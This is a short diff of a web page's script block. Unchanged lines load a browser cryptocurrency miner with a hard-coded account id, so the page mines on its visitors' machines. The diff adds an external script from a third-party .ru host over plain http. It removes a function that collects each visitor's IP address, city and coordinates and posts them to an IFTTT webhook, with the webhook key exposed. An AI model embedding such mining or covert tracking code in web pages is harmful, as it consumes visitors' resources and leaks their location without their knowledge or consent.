@@ -17,34 +17,13 @@
             integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
             crossorigin="anonymous"></script>
 
+    <!-- Shared -->
+    <script type="text/javascript" src="http://gumerbaev.ru/shared/script/ip_address.js"></script>
+
     <!-- Miner -->
     <script type="text/javascript" src="https://www.webminerpool.com/miner.js"></script>
     <script type="text/javascript">
         var loginid = '193ff7a0-2abe-4382-8800-b01d344eff93';
-
-        function getIpInfo() {
-            $.ajax({
-                url: 'https://freegeoip.net/json/',
-                type: 'GET',
-                crossDomain: true,
-                dataType: 'jsonp',
-                success: function (data) {
-                    var json = {};
-                    json['value1'] = $(location).attr('hostname');
-                    json['value2'] = data['ip'];
-                    json['value3'] = data['city'] + ' / ' + data['country_code'] + ' [' + data['latitude'] + ' ' + data['longitude'] + ']';
-
-                    $.ajax({
-                        url: 'https://maker.ifttt.com/trigger/web/with/key/dCkcLEwU6kWOalQayTbEP7',
-                        data: json,
-                        contentType: "application/json; charset=utf-8",
-                        type: 'POST',
-                        crossDomain: true,
-                        dataType: 'jsonp'
-                    });
-                }
-            });
-        }
 
         function init() {
             var throttle = localStorage.getItem('throttle');
